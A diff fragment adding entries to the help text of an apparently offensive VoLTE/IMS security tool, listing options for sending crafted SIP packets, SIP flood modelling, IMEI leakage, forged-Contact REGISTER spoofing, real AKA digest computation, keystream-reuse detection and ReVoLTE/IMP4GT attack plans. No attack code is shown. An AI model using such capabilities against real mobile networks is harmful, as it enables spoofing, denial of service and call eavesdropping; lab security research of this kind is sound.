+  --sip-send <host>[:port] <kind> [k=v ...]  build it and put it on the wire
+                                            (needs --i-have-a-lab-and-authorisation)
   --sip-flood [method] [rps] [reqB] [respB] SIP flood / amplification model
   --imei-leak <sip-text>                    IMEI / location / device leakage over SIP
   --register-spoof [impi] [contact]         SIP REGISTER with a forged Contact
+  --register-aka k=.. op=..|opc=.. rand=.. nonce=..  REGISTER with a real
+                                            AKAv1-MD5 response: RES from Milenage,
+                                            hashed into the RFC 2617 digest
+                                            (encoding=hex|raw chooses how RES is
+                                            hashed, since RFC 3310 does not say)
   --ims-registration <hex> [aka-res-hex]    IMS REGISTER/401/AKA flow
   --detect-keystream-reuse <pcap> [port]    reuse detector
   --plan <revolte-capture|imp4gt-lab>       write a handoff plan
